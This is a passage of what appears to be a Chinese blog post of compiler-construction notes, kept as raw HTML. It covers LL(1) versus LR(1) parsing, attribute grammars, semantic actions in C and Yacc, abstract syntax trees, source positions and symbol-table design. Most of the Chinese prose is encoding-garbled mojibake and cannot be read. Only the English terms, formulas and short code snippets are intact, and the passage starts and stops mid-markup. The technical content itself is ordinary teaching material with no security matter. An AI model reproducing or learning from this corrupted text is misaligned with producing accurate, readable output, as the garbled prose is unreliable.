‘</td>\n<td>è‡ªåº•è€Œä¸Š</td>\n<td>è‡ªé¡¶è€Œä¸‹</td>\n</tr>\n<tr>\n<td>å½’çº¦oræ¨å¯¼</td>\n<td>è§„èŒƒå½’çº¦(æœ€å³æ¨å¯¼çš„é€†)</td>\n<td>æœ€å·¦æ¨å¯¼</td>\n</tr>\n<tr>\n<td>åˆ†æè¡¨ï¼ˆè¡Œxåˆ—ï¼‰</td>\n<td>çŠ¶æ€Ã—æ–‡æ³•ç¬¦å·ï¼Œå¤§</td>\n<td>éç»ˆç»“ç¬¦Ã—ç»ˆç»“ç¬¦ï¼Œå°</td>\n</tr>\n<tr>\n<td>åˆ†ææ ˆ</td>\n<td>çŠ¶æ€æ ˆï¼Œä¿¡æ¯æ›´å¤š</td>\n<td>æ–‡æ³•ç¬¦å·æ ˆ</td>\n</tr>\n</tbody></table>\n<ul>\n<li>LL(1): å¯¹äºå¤šä¸ªå¯é€‰äº§ç”Ÿå¼ $A\\rightarrow \\alpha_1|\\alpha_2|â€¦$ å‘å‰çœ‹ä¸‹ä¸€ä¸ªè¾“å…¥æ ¹æ®First,Followç¡®å®šä½¿ç”¨å“ªæ¡äº§ç”Ÿå¼æ¨å¯¼</li>\n<li>LR(1): å¯¹äºå¤šä¸ªå¯é€‰äº§ç”Ÿå¼ $A\\rightarrow \\alpha,\\ B\\rightarrow \\alpha,â€¦ $ åœ¨è¯†åˆ«å‡ºæ•´ä¸ª$\\alpha$åï¼Œå†å¾€å‰çœ‹1ä¸ªç¬¦å·ï¼Œç„¶åç¡®å®šä½¿ç”¨å“ªæ¡äº§ç”Ÿå¼å½’çº¦</li>\n</ul>\n<h3 id=\"LL-1-LR-1-SLR\"><a href=\"#LL-1-LR-1-SLR\" class=\"headerlink\" title=\"LL(1) LR(1) SLR\"></a>LL(1) LR(1) SLR</h3><p><img src=\"/compiler-construction-principles/grammar-compare.png\" loading=\"lazy\"></p>\n<h2 id=\"Part-7-æŠ½è±¡è¯­æ³•\"><a href=\"#Part-7-æŠ½è±¡è¯­æ³•\" class=\"headerlink\" title=\"Part 7: æŠ½è±¡è¯­æ³•\"></a>Part 7: æŠ½è±¡è¯­æ³•</h2><p>ç¼–ç¨‹è¯­è¨€ &#x3D; è¯­æ³•ï¼ˆè¯†åˆ«ä¸€ä¸ªåˆæ³•çš„ç¨‹åºï¼‰ + è¯­ä¹‰ï¼ˆè¿™ä¸ªåˆæ³•çš„ç¨‹åºå¯¹åº”çš„å®é™…è¡Œä¸ºï¼‰</p>\n<ul>\n<li>è¯­æ³•ï¼šå·²ç»åœ¨ä¹‹å‰ç« èŠ‚è®¨è®ºè¿‡ã€‚</li>\n<li>è¯­ä¹‰ï¼š<ul>\n<li>æ“ä½œè¯­ä¹‰ï¼šå¦‚ä½•æ‰§è¡Œç¨‹åºï¼Ÿ</li>\n<li><del>å…¬ç†è¯­ä¹‰ï¼šæˆ‘ä»¬å¯ä»¥è¯æ˜ç¨‹åºçš„é‚£äº›æ€§è´¨ï¼Ÿ</del>ï¼ˆè¯¥éƒ¨åˆ†ä¸åœ¨æœ¬è¯¾è®¨è®ºï¼‰</li>\n<li>æŒ‡ç§°è¯­ä¹‰ï¼šç¨‹åºæ˜¯åšä»€ä¹ˆçš„ï¼Ÿ</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"å±æ€§æ–‡æ³•Attribute-Grammar\"><a href=\"#å±æ€§æ–‡æ³•Attribute-Grammar\" class=\"headerlink\" title=\"å±æ€§æ–‡æ³•Attribute Grammar\"></a>å±æ€§æ–‡æ³•Attribute Grammar</h3><p>å±æ€§æ–‡æ³•&#x3D;<strong>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•+å±æ€§+å±æ€§è®¡ç®—è§„åˆ™</strong></p>\n<ul>\n<li>å±æ€§:&#x3D; æè¿°æ–‡æ³•ç¬¦å·çš„è¯­ä¹‰ç‰¹å¾ï¼Œæ¯”å¦‚è¡¨è¾¾å¼Eçš„å€¼æˆ‘ä»¬å¯ä»¥è®°ä¸ºE.val</li>\n<li>å±æ€§è®¡ç®—è§„åˆ™(è¯­ä¹‰è§„åˆ™):&#x3D; ä¸äº§ç”Ÿå¼ç›¸å…³è”ã€åæ˜ æ–‡æ³•ç¬¦å·å±æ€§ä¹‹é—´å…³ç³»çš„è§„åˆ™ï¼Œæ¯”å¦‚åœ¨ä¹˜æ³•è¡¨è¾¾å¼ä¸­å·¦ä¾§çš„E.valè¦å¦‚ä½•è®¡ç®—<ul>\n<li>ä»…è¡¨æ˜å±æ€§é—´â€œæŠ½è±¡â€å…³ç³»ï¼Œä¸æ¶‰åŠè®¡ç®—æ¬¡åºç­‰å…·ä½“å®ç°ç»†èŠ‚</li>\n</ul>\n</li>\n<li>åº”ç”¨ï¼š<ul>\n<li>â€œæ¨å¯¼ç±»â€ï¼šä¾‹å¦‚å¾ˆå¤šè¯­è¨€çš„<strong>ç¼–è¯‘æœŸæ±‚å€¼</strong></li>\n<li>â€œç”Ÿæˆç±»â€ï¼šç”ŸæˆASTï¼Œ ä¸­é—´ä»£ç ç­‰</li>\n<li>â€¦</li>\n</ul>\n</li>\n<li>å®ç°ï¼šä¾‹å¦‚åœ¨å…ˆå‰ç« èŠ‚ä¸­Yaccç­‰Parserç”Ÿæˆå™¨çš„<strong>è¯­ä¹‰åŠ¨ä½œ</strong></li>\n</ul>\n<h3 id=\"è¯­ä¹‰åŠ¨ä½œSemantic-Action\"><a href=\"#è¯­ä¹‰åŠ¨ä½œSemantic-Action\" class=\"headerlink\" title=\"è¯­ä¹‰åŠ¨ä½œSemantic Action\"></a>è¯­ä¹‰åŠ¨ä½œSemantic Action</h3><p>æˆ‘ä»¬å¯ä»¥ç»™äº§ç”Ÿå¼ç»‘å®šä¸€ä¸ªè¯­ä¹‰åŠ¨ä½œï¼Œä½¿å¾—æŒ‰ç…§è¿™ä¸ªäº§ç”Ÿå¼è§„çº¦æ—¶&#x2F;æ¨å¯¼æ—¶å®Œæˆç‰¹å®šæ“ä½œã€‚</p>\n<p>æ¯ä¸ªtokenéƒ½å¯èƒ½æœ‰ç‹¬å±äºè‡ªå·±çš„**è¯­ä¹‰å€¼(Semantic Value)**ã€‚æ¯ç§tokençš„è¯­ä¹‰å€¼ç±»å‹å¯ä»¥ä¸åŒï¼Œæˆ‘ä»¬æŠŠAçš„è¯­ä¹‰å€¼çš„ç±»å‹ç§°ä¸ºâ€œAçš„å…³è”ç±»å‹â€ã€‚<br>ä¾‹å¦‚å¯¹äºäº§ç”Ÿå¼ $A\\rightarrow B\\ C\\ D$</p>\n<ul>\n<li>è¯­ä¹‰åŠ¨ä½œè¿”å›å€¼å¿…é¡»æ˜¯<em>Açš„å…³è”ç±»å‹</em></li>\n<li>è¿™ä¸ªå€¼å¯ä»¥é€šè¿‡B C Då„è‡ªçš„è¯­ä¹‰å€¼è¿›è¡Œè¿ç®—å¾—å‡º</li>\n</ul>\n<p>ä¾‹å¦‚æˆ‘ä»¬é€šè¿‡å¦‚ä¸‹è¯­ä¹‰åŠ¨ä½œå¯ä»¥åœ¨ç¼–è¯‘æœŸç›´æ¥evaluateè¡¨è¾¾å¼çš„å€¼ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E-&gt;E1 + T   &#123; E.val= E1.val + T.val &#125;</span><br><span class=\"line\">E-&gt;E1 â€“ T   &#123; E.val= E1.val - T.val &#125;</span><br><span class=\"line\">E-&gt;T        &#123; E.val= T.val &#125;</span><br><span class=\"line\">T-&gt;(E)      &#123; T.val= E.val &#125;</span><br><span class=\"line\">T-&gt;num      &#123; T.val= num.val &#125;</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨é€’å½’ä¸‹é™æ³•ä¸­ï¼Œè¯­ä¹‰åŠ¨ä½œä½“ç°ä¸ºæ¯ä¸ªç¬¦å·å¯¹åº”çš„parsingå‡½æ•°ã€‚è¿™é‡Œæˆ‘ä»¬åŒæ—¶å…³å¿ƒå‡½æ•°çš„<strong>è¿”å›å€¼</strong>ä¸<strong>å‰¯ä½œç”¨</strong>ã€‚<br>å› æ­¤å‡è®¾Tå’ŒFä¸¤ä¸ªtokençš„å…³è”ç±»å‹éƒ½æ˜¯<code>int</code>ï¼Œå¯¹äºè¡¨è¾¾å¼ $T\\rightarrow T * F$ æˆ‘ä»¬å¯ä»¥å¦‚æ­¤å®ç°è¯­ä¹‰åŠ¨ä½œï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> a= T();</span><br><span class=\"line\">eat(TIMES); <span class=\"comment\">// &#x27;*&#x27;</span></span><br><span class=\"line\"><span class=\"type\">int</span> b= F();</span><br><span class=\"line\"><span class=\"keyword\">return</span> a*b;</span><br></pre></td></tr></table></figure>\n\n<p>è€Œå¯¹äºParserç”Ÿæˆå™¨æ¥è¯´ï¼Œå…¶å®ç°æ–¹å¼æœ‰æ‰€ä¸åŒï¼Œä»¥Yaccä¸ºä¾‹ï¼š</p>\n<ul>\n<li>ç”¨ä¸€ä¸ªæ ˆå‚¨å­˜è¯­ä¹‰å€¼ï¼Œè¿™ä¸ªæ ˆå’ŒçŠ¶æ€æ ˆæ˜¯åŒæ­¥çš„</li>\n<li>å½“è¿›è¡Œ<strong>è§„çº¦</strong>æ“ä½œæ—¶ï¼Œéœ€è¦æ‰§è¡Œç›¸åº”çš„è¯­ä¹‰åŠ¨ä½œï¼ˆCè¯­è¨€å®ç°ï¼‰<ul>\n<li>å¯èƒ½ç”¨åˆ°çš„å€¼ä¸€å®šå¯ä»¥é€šè¿‡å¤šæ¬¡popè¯­ä¹‰å€¼æ ˆè·å¾—ï¼ˆå’ŒçŠ¶æ€æ ˆpopåŒæ­¥ï¼‰</li>\n<li>popå®Œæ¯•åè¿ç®—å¾—åˆ°çš„æ–°å€¼å‹å…¥è¯¥æ ˆï¼ˆå’ŒçŠ¶æ€æ ˆå‹å…¥æ–°çŠ¶æ€åŒæ­¥ï¼‰</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"æŠ½è±¡è§£ææ ‘Abstract-Parse-Tree\"><a href=\"#æŠ½è±¡è§£ææ ‘Abstract-Parse-Tree\" class=\"headerlink\" title=\"æŠ½è±¡è§£ææ ‘Abstract Parse Tree\"></a>æŠ½è±¡è§£ææ ‘Abstract Parse Tree</h3><p>è¯­ä¹‰åŠ¨ä½œçš„ä¸€ç§åº”ç”¨ã€‚</p>\n<blockquote>\n<p>âš å’ŒæŠ½è±¡è¯­æ³•æ ‘(Abstract Syntax Tree)çš„åŒºåˆ«è¯·å‚é˜…<a href=\"https://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-trees-and-abstract-syntax-trees-asts\">https://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-trees-and-abstract-syntax-trees-asts</a></p>\n</blockquote>\n<p>èƒ½å¦<strong>é€šè¿‡æè¿°è¯­ä¹‰åŠ¨ä½œç›´æ¥å®ç°æ•´ä¸ªç¼–è¯‘å™¨</strong>ï¼Ÿå¯ä»¥ï¼Œä½†æ˜¯éš¾ä»¥ç»´æŠ¤ï¼Œä¸”å¿…é¡»ä¿è¯è¿™äº›è¯­ä¹‰å€¼çš„è®¡ç®—é¡ºåºå’ŒParsingé¡ºåºå®Œå…¨ä¸€è‡´ã€‚</p>\n<ul>\n<li>è€ƒè™‘åˆ†ç¦»è¯­æ³•è§£æï¼ˆParsingï¼‰å’Œè¯­ä¹‰åŠ¨ä½œï¼šä¸€ä¸ªå¯è¡Œæ–¹æ¡ˆæ˜¯Parsingå¾—åˆ°æ ‘ï¼Œè€Œåéå†ä»¥è¿›è¡Œè¯­ä¹‰ç›¸å…³çš„æ“ä½œã€‚</li>\n</ul>\n<p>æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ°ä¸€æ£µæ ‘ï¼šå¶èŠ‚ç‚¹å¯¹åº”è¾“å…¥çš„tokenï¼Œå†…éƒ¨èŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªè¯­æ³•è§„åˆ™ã€‚è¿™è¢«ç§°ä¸º<strong>concrete parse tree</strong>.<br><img src=\"/compiler-construction-principles/concrete-pt.png\" alt=\"concrete-pt\" loading=\"lazy\"></p>\n<ul>\n<li>ç¼ºç‚¹ï¼šå¤ªâ€œå•°å—¦â€ã€‚ä¾‹å¦‚æ‹¬å·ç›¸å…³äº§ç”Ÿå¼åªæ˜¯ä¸ºäº†è§£æé¡ºåºæ­£ç¡®æ‰æœ‰çš„ï¼Œæ²¡å¿…è¦æ”¾è¿›æ ‘é‡Œã€‚</li>\n</ul>\n<h3 id=\"æŠ½è±¡è¯­æ³•æ ‘Abstract-Syntax-Tree\"><a href=\"#æŠ½è±¡è¯­æ³•æ ‘Abstract-Syntax-Tree\" class=\"headerlink\" title=\"æŠ½è±¡è¯­æ³•æ ‘Abstract Syntax Tree\"></a>æŠ½è±¡è¯­æ³•æ ‘Abstract Syntax Tree</h3><p>å¯ä»¥æä¾›ä¸€ä¸ª<em>å¹²å‡€çš„</em>ï¼ˆä¸åŒ…å«Parsingçš„é‚£äº›ç¹æ–‡ç¼›èŠ‚ï¼‰æ¥å£ç”¨äºåç»­ç¼–è¯‘æµç¨‹çš„å®ç°æˆ–ä¼˜åŒ–ï¼ˆç¼–è¯‘å™¨åç«¯ï¼‰ã€‚<br>ç”Ÿæˆæ–¹å¼ï¼šç”¨<strong>å…·ä½“è¯­æ³•</strong>ï¼ˆParserç”Ÿæˆå™¨èƒ½æ‡‚çš„ï¼‰ä¸º<strong>æŠ½è±¡è¯­æ³•</strong>ï¼ˆæˆ‘ä»¬æƒ³è¦çš„ã€æ›´å¯è¯»çš„ï¼‰ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘<br><img src=\"/compiler-construction-principles/AST.png\" alt=\"AST\" loading=\"lazy\"></p>\n<p>å®ç°ï¼š</p>\n<ul>\n<li>ä¸ºæ¯ä¸€ä¸ªéç»ˆç»“ç¬¦å®šä¹‰ä¸€ä¸ªç±»å‹å£°æ˜ï¼Œç”¨äºè¡¨ç¤ºå…¶å…³è”ç±»å‹</li>\n<li>äº§ç”Ÿå¼ç»Ÿä¸€æ”¾è¿›ä¸€ä¸ªunionï¼ˆå¦‚æœæ˜¯Rustå°±æ˜¯Optionç›´æ¥è§£å†³ï¼Œ<del>Cè¯­è¨€å¤ªåäº†</del>ï¼‰é‡Œï¼Œæ¯ä¸€ä¸ªäº§ç”Ÿå¼å°±æ˜¯unioné‡Œçš„ä¸€ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ç”¨äºå‚¨å­˜å…¶å­èŠ‚ç‚¹ <img src=\"/compiler-construction-principles/AST-def.png\" loading=\"lazy\"></li>\n<li>ä¸ºæ¯ä¸ªäº§ç”Ÿå¼å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œé™¤äº†è®¡ç®—éœ€è¦çš„è¯­ä¹‰å€¼è¿”å›ä»¥å¤–ï¼Œè¿˜å°†ç”³è¯·ç©ºé—´ã€åˆ†é…æ–°çš„æ ‘èŠ‚ç‚¹å¹¶è®¾ç½®å¥½å…¶å­èŠ‚ç‚¹ <img src=\"/compiler-construction-principles/AST-impl.png\" loading=\"lazy\"></li>\n<li>ä»¥Yaccä¸ºä¾‹ï¼ŒæŠŠè¿™äº›å‡½æ•°æ”¾å…¥å¯¹åº”äº§ç”Ÿå¼çš„è¯­ä¹‰åŠ¨ä½œå—ä¸­å³å¯åœ¨è§„çº¦æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚éšç€Parsingçš„é€æ­¥æ¨è¿›ï¼Œæ¯æ¬¡è§„çº¦éƒ½å¯ä»¥äº§ç”Ÿä¸€ä¸ªæ–°çš„å†…éƒ¨èŠ‚ç‚¹ï¼Œæœ€ç»ˆé€æ­¥æ„å»ºå‡ºæ•´é¢—AST</li>\n</ul>\n<p>æ­¤å¤–ï¼Œé€šè¿‡éå†ASTè¿˜èƒ½åšå¾ˆå¤šï¼š</p>\n<ul>\n<li>é€šè¿‡ä¸€äº›â€œå˜å½¢â€ç¼©å°æ ‘çš„è§„æ¨¡ï¼Œå‡å°‘æœ€ç»ˆä»£ç çš„å¤§å°</li>\n<li>é€šè¿‡ä¸€äº›â€œå˜å½¢â€ä¼˜åŒ–æ ‘çš„ç»“æ„ï¼Œæé«˜æœ€ç»ˆä»£ç çš„æ€§èƒ½</li>\n<li>ä»£ç å†…è”ä¼˜åŒ–</li>\n<li>é™æ€åˆ†æï¼Œç¼–è¯‘æœŸæ¨å¯¼å€¼</li>\n<li>ç±»å‹ç³»ç»Ÿæ£€æŸ¥ç­‰å®‰å…¨æ£€æŸ¥</li>\n<li>ç¿»è¯‘åˆ°ä¸­é—´è¡¨ç¤ºï¼Œè™½ç„¶<strong>ASTä¹Ÿå¸¸è¢«è§†ä½œä¸€ç§â€œä¸­é—´è¡¨ç¤ºâ€</strong></li>\n</ul>\n<h3 id=\"ä½ç½®Position\"><a href=\"#ä½ç½®Position\" class=\"headerlink\" title=\"ä½ç½®Position\"></a>ä½ç½®Position</h3><p>åœ¨one-passç¼–è¯‘å™¨ä¸­ï¼Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†ææ˜¯åŒæ­¥è¿›è¡Œçš„ã€‚è€Œé”™è¯¯å‘ç”Ÿæ—¶ï¼Œ<strong>è¯æ³•åˆ†æå™¨lexer</strong>çš„ä½ç½®å¯ä»¥ç”¨æ¥ä½œä¸ºé”™è¯¯å‘ç”Ÿä½ç½®çš„åˆç†ä¼°è®¡åé¦ˆç»™ç”¨æˆ·ã€‚æ‰€ä»¥ï¼Œlexerå­˜æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ç»´æŠ¤å½“å‰ä½ç½®ä¿¡æ¯ã€‚</p>\n<p>ç„¶è€Œï¼Œå¯¹äºä½¿ç”¨ASTçš„ç¼–è¯‘å™¨ï¼Œè¯æ³•åˆ†æç»“æŸåæ‰å¼€å§‹è¯­æ³•åˆ†æï¼Œå› æ­¤è¿™æ˜¯ä¸å¯è¡Œçš„ã€‚<br>è§£å†³æ–¹æ¡ˆï¼šASTæ¯ä¸ªèŠ‚ç‚¹è®°å½•è‡ªå·±åœ¨æºæ–‡ä»¶ä¸­çš„<strong>ä½ç½®</strong>ï¼Œæ ‡è®°è‡ªå·±æ˜¯å…·ä½“å“ªå‡ ä¸ªå­—ç¬¦æ´¾ç”Ÿè€Œæ¥çš„ã€‚</p>\n<ul>\n<li><p>lexeræŠŠæ¯ä¸ªtokençš„èµ·å§‹ä½ç½®ã€ç»“æŸä½ç½®ä¼ é€’ç»™parser</p>\n</li>\n<li><p>parserç»´æŠ¤<em>ä½ç½®æ ˆ</em>ä¸<em>è¯­ä¹‰å€¼æ ˆ</em>ï¼Œè¿™æ ·è¯­ä¹‰æ“ä½œå°±çŸ¥é“ä½ç½®ä¿¡æ¯äº†</p>\n<ul>\n<li>ä¸æ˜¯æ‰€æœ‰çš„Parserç”Ÿæˆå™¨éƒ½å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼šä¾‹å¦‚Bisonå¯ä»¥ä½†Yaccä¸è¡Œ</li>\n<li>å¯¹äºYaccç­‰æ— æ³•ç›´æ¥å®ç°çš„ï¼Œå¯ä»¥å¼•å…¥æ–°çš„éç»ˆç»“ç¬¦posï¼ˆå…¶è¯­ä¹‰å€¼åŒ…å«éœ€è¦çš„ä½ç½®ä¿¡æ¯ï¼‰å¹¶æ”¹å†™æ–‡æ³•ã€‚ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å¦‚æ­¤æ”¹å†™PLUSè¡¨è¾¾å¼ä»¥åˆ©ç”¨ä½ç½®ä¿¡æ¯ï¼š</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%&#123; extern A_OpExp(A_exp, A_binop, A_exp, position); %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">%union &#123;</span><br><span class=\"line\">    int num;</span><br><span class=\"line\">    string id;</span><br><span class=\"line\">    position pos;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">%type &lt;pos&gt; pos</span><br><span class=\"line\"></span><br><span class=\"line\">pos: &#123; $$ = EM_tokpos; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">exp: exp PLUS pos exp &#123; $$ = A_OpExp($1, A_plus, $4, $3); &#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"Part-8-è¯­ä¹‰åˆ†æ\"><a href=\"#Part-8-è¯­ä¹‰åˆ†æ\" class=\"headerlink\" title=\"Part 8: è¯­ä¹‰åˆ†æ\"></a>Part 8: è¯­ä¹‰åˆ†æ</h2><p>æˆ‘ä»¬æ³¨æ„åˆ°ä¸Šè¿°çš„å±æ€§æ–‡æ³•ç­‰å†…å®¹åªé€‚ç”¨äºä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•CFG.<br>ç„¶è€ŒCFGæœ‰å¾ˆå¤šä¸è¶³ï¼Œä¾‹å¦‚æˆ‘ä»¬ä¸å¯èƒ½å®Œæˆï¼š</p>\n<ul>\n<li>æ£€æŸ¥æ•°ç»„å¼•ç”¨çš„ç»´åº¦æ˜¯å¦åŒ¹é…</li>\n<li>æ£€æŸ¥æ•°ç»„è¶Šç•Œ</li>\n<li>ç¡®å®šå˜é‡åº”å‚¨å­˜äºæ ˆä¸Šè¿˜æ˜¯å †ä¸Š</li>\n<li>â€¦</li>\n</ul>\n<p>è¿™æ˜¯å› ä¸ºï¼Œè¿™äº›æ£€æŸ¥å’Œå€¼æœ‰å…³ï¼ˆæ¶‰åŠè¯­ä¹‰ï¼‰ï¼Œè€Œéè¯­æ³•æœ¬èº«ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡æ£€æŸ¥ã€éå†<strong>ç¨‹åºè¡¨ç¤º(Program Representation)<strong>æ¥å®Œæˆ</strong>ï¼ˆå¹¿ä¹‰çš„ï¼‰è¯­ä¹‰åˆ†æ</strong>ã€‚<br>å¸¸ç”¨çš„ç¨‹åºè¡¨ç¤ºï¼š</p>\n<ul>\n<li>abstract syntax tree (AST)</li>\n<li>control flow graph (CFG)</li>\n<li>programdependence graph (PDG)</li>\n<li>valueflowgraph (VFG)</li>\n<li>single static assignment (SSA)</li>\n</ul>\n<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ï¼š</p>\n<ul>\n<li>ç±»å‹æ£€æŸ¥</li>\n<li>ä»£ç ç”Ÿæˆ</li>\n<li>å»é™¤dead code</li>\n<li>å¯„å­˜å™¨åˆ†é…</li>\n<li>â€¦</li>\n</ul>\n<p>åœ¨æœ¬è¯¾ä¸­ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨çš„ï¼ˆç‹­ä¹‰çš„ï¼‰è¯­ä¹‰åˆ†ææŒ‡çš„æ˜¯é€šè¿‡æ£€æŸ¥ASTè·çŸ¥ç¨‹åºçš„é™æ€å±æ€§ï¼ŒåŒ…æ‹¬ï¼š</p>\n<ul>\n<li>ä½œç”¨åŸŸ(Scope)ä¸å˜é‡å¯è§æ€§</li>\n<li>å˜é‡ã€å‡½æ•°ã€è¡¨è¾¾å¼çš„ç±»å‹<br>ä»¥åŠå°†ASTè½¬ä¸ºä¸­é—´ä»£ç (Intermediate Code)</li>\n</ul>\n<h3 id=\"ç¬¦å·è¡¨Symbol-Table\"><a href=\"#ç¬¦å·è¡¨Symbol-Table\" class=\"headerlink\" title=\"ç¬¦å·è¡¨Symbol Table\"></a>ç¬¦å·è¡¨Symbol Table</h3><p>Binding:&#x3D; æŠŠç±»å‹ã€å€¼ç­‰ä¿¡æ¯ç»‘å®šåˆ°ä¸€ä¸ªidentifierä¸Š<br>Environment:&#x3D; ä¸€äº›ç»‘å®šçš„é›†åˆï¼Œä½“ç°äº†ç¨‹åºå½“å‰ç¯å¢ƒä¸‹å·²å£°æ˜çš„ä¸€äº›å˜é‡&#x2F;å‡½æ•°&#x2F;â€¦</p>\n<p><strong>ç¬¦å·è¡¨</strong>å°±æ˜¯Environmentçš„ä¸€ç§å®ç°æ–¹å¼ã€‚æˆ‘ä»¬åœ¨éå†ASTçš„è¿‡ç¨‹ä¸­å¯ä»¥ç»´æŠ¤ä¸€ä¸ªç¬¦å·è¡¨ç”¨äºè¯­ä¹‰åˆ†æã€‚<br>ç¬¦å·è¡¨ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†å°±æ˜¯å„ä¸ªå±€éƒ¨å˜é‡åŠå…¶ä½œç”¨åŸŸã€‚å½“é€€å‡ºä½œç”¨åŸŸæ—¶ï¼Œè‡ªç„¶å°±éœ€è¦ä¸¢å¼ƒå†…éƒ¨çš„ä¸€äº›binding.<br>å˜é‡åœ¨scopeå†…é‡æ–°å®šä¹‰æ—¶éœ€è¦è¦†ç›–ï¼ˆå±è”½ï¼‰æ‰æ›´å¤§ä½œç”¨åŸŸçš„ï¼Œé€€å‡ºæ—¶åˆ™è¿˜åŸã€‚<br>å› æ­¤å¯è§æˆ‘ä»¬éœ€è¦ä¸ºç¬¦å·è¡¨å®ç°çš„æ¥å£åŒ…æ‹¬ï¼š</p>\n<ul>\n<li>insert: å°†åç§°ç»‘å®šåˆ°ç›¸å…³ä¿¡æ¯(type, value, â€¦), ä¸”å°†è¦†ç›–å·²æœ‰çš„ç»‘å®šå…³ç³»ï¼ˆå¦‚æœå­˜åœ¨ï¼‰</li>\n<li>lookup: ç”¨åç§°æŸ¥æ‰¾ä¿¡æ¯</li>\n<li>beginScope: è¿›å…¥ä½œç”¨åŸŸ</li>\n<li>endScope: é€€å‡ºä½œç”¨åŸŸï¼Œå°†ç¬¦å·è¡¨æ¢å¤åˆ°è¿›å…¥ä¹‹å‰çš„çŠ¶æ€</li>\n</ul>\n<p>åœ¨Javaç­‰è¯­è¨€ä¸­ï¼Œå¯èƒ½æœ‰å¤šä¸ªç¯å¢ƒåŒæ—¶æ´»è·ƒï¼ˆå¯¹åº”ä¸åŒçš„module, classç­‰ï¼‰ï¼Œä»–ä»¬éƒ½éœ€è¦ä¸€ä¸ªç¬¦å·è¡¨ã€‚è¿™è¢«ç§°ä¸ºå¤šç¬¦å·è¡¨ã€‚</p>\n<ul>\n<li>ç¬¦å·è¡¨çš„å®ç°ï¼š<br>ç»‘å®šæ—¶ï¼Œå¦‚æœé‡åˆ°äº†ç¬¦å·å·²ç»å­˜åœ¨çš„æƒ…å†µï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§ç­–ç•¥ï¼š<ul>\n<li>Imperative Style: ç›´æ¥è¦†ç›–æ—§çš„ç»‘å®šï¼Œè¿™æ ·æˆ‘ä»¬ä¸å¯èƒ½lookupåˆ°æ—§çš„ä¿¡æ¯ã€‚å½“è¿™ä¸ªæ–°çš„ç»‘å®šä¸å†æœ‰æ•ˆæ—¶ï¼Œéœ€è¦å¤åŸæ—§çš„ç»‘å®šã€‚<ul>\n<li>å¦‚ä½•å¿«é€Ÿlookupä¸”æ”¯æŒåˆ é™¤å’Œå¤åŸ(restore): ä½¿ç”¨å“ˆå¸Œè¡¨å¥—é“¾è¡¨å‚¨å­˜æ¯å¯¹binding. æˆ‘ä»¬ç§°å“ˆå¸Œè¡¨ä¸­çš„å…ƒç´ ä¸ºbucket</li>\n<li>insert: ç›´æ¥æ’å…¥å¯¹åº”bucketçš„é“¾è¡¨å¤´ã€‚å¦‚æœå·²ç»å­˜åœ¨ï¼Œç”±äºè¿™ä½¿å¾—æ–°çš„bindingå…³ç³»æ›´é å‰ï¼Œè¿™æ ·åšå¯ä»¥æˆåŠŸè¦†ç›–</li>\n<li>restore: å¯¹åº”bucketçš„é“¾è¡¨å¤´å¼¹å‡ºå¤´éƒ¨çš„ä¸€äº›å…ƒç´ </li>\n<li>æˆ‘ä»¬ä¼šå‘ç°éœ€è¦ç»´æŠ¤ä¸€äº›å¿…è¦çš„é¢å¤–ä¿¡æ¯ï¼ˆæ¯”å¦‚scopeå˜åŒ–æ—¶åº”è¯¥è¦å¼¹å‡ºå‡ æ¬¡ï¼‰</li>\n</ul>\n</li>\n<li>Functional Style: æ°¸è¿œä¿ç•™è€çš„ï¼Œåªæ˜¯æŸ¥è¯¢æ—¶åšä¸€äº›é¢å¤–å¤„ç†ï¼ˆå¯ä»¥ç†è§£ä¸ºåªæ˜¯renamingï¼‰ã€‚è¿™æ ·è¿˜åŸæ›´ç®€å•ã€‚<ul>\n<li>ç›´æ¥ä½¿ç”¨BSTï¼ˆçº¢é»‘æ ‘ç­‰ï¼‰å®ç°æŸ¥æ‰¾</li>\n<li>å¯ä»¥ä½¿ç”¨å¯æŒä¹…åŒ–æ•°æ®ç»“æ„å®Œæˆåˆ 